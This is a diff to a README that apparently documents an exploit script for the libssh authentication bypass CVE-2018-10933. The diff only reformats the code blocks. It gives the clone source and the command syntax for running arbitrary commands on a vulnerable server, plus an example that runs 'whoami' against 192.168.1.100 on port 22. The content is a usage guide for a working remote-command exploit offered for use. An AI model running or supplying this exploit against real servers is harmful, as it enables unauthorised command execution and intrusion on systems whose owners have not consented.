@@ -25,10 +25,16 @@ git clone https://github.com/blacknbunny/CVE-2018-10933.git
 - Navigate to the cloned directory. 
 - Run the exploit script with the appropriate parameters: 
 
-```python libsshauthbypass.py --host <ip> --port <port> --command <command_line>``` 
+```py
+python libsshauthbypass.py --host <ip> --port <port> --command <command_line>
+```
+
 Replace <ip> with the IP address of the vulnerable server, <port> with the port number, and <command_line> with the desired command to execute. 
 
 ### Example 
 
-```python libsshauthbypass.py --host 192.168.1.100 --port 22 --command "whoami"``` 
+```py
+python libsshauthbypass.py --host 192.168.1.100 --port 22 --command "whoami"
+```
+
 This command will exploit the vulnerability on a server with IP address 192.168.1.100 listening on port 22, executing the whoami command.
